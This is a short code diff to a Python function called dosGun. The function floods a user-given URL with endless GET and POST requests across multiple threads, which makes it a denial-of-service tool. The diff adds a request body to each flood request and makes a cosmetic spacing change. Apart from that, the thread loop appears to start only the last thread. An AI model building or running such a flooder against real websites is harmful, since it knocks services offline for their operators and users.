@@ -15,8 +15,8 @@ def dosGun():
 
     def dos():
         while True:
-            libs.URL.urlSet(url, 'get', '', libs.URL.headers(), '')
-            libs.URL.urlSet(url, 'post', '', libs.URL.headers(), '')
+            libs.URL.urlSet(url, 'get', '', libs.URL.headers(), '', libs.URL.body())
+            libs.URL.urlSet(url, 'post', '', libs.URL.headers(), '', libs.URL.body())
             if keyboard.is_pressed('esc'):
                 print('')
                 print(">> Program stopped")
@@ -26,7 +26,7 @@ def dosGun():
         dosGun()
 
     for i in range(int(thrNum)):
-        thr = Thread(target=dos)
+        thr = Thread(target = dos)
         print(f'   Spam thread launched on the URL: {url}')
 
     thr.start()
